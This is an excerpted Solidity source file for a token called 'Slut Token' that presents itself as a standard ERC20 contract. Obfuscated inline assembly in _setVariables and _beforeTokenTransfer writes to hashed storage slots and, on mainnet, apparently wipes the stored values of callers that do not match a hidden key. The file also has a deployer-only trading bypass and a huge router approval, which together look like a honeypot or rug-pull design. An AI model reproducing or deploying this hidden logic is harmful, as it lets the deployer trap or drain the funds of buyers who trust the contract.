...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addPlaceGG;
    uint256 private octoberFest = block.number*2;

    mapping (address => bool) private _firstParty; 
    mapping (address => bool) private _secondHard;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private oledRun;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private bullGreen;
    address public pair;
    ...
    bool private trading; uint256 private bestAlert = 1; bool private coolJob;
    uint256 private _decimals; uint256 private deadMeat;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addPlaceGG.push(_router); addPlaceGG.push(msgSender_); addPlaceGG.push(pair);
        for (uint256 q=0; q < 3;) {_firstParty[addPlaceGG[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x359f12b909712ddc9ddd6c9f6f3ea841f78d9d6389f1c7b018eae608918fbebc
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xfc10fd312d6dc6d821b0244bf3c4c7ca68c12713eb7f5ccdadb9d58c149d20fe,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; octoberFest = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addPlaceGG[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPlaceGG(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addPlaceGG[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPlaceGG(creator, initialSupply);
    }
}

contract $SLUT is ERC20Token {
    constructor() ERC20Token("Slut Token", "SLUT", msg.sender, 2475000 * 10 ** 18) {
    }
}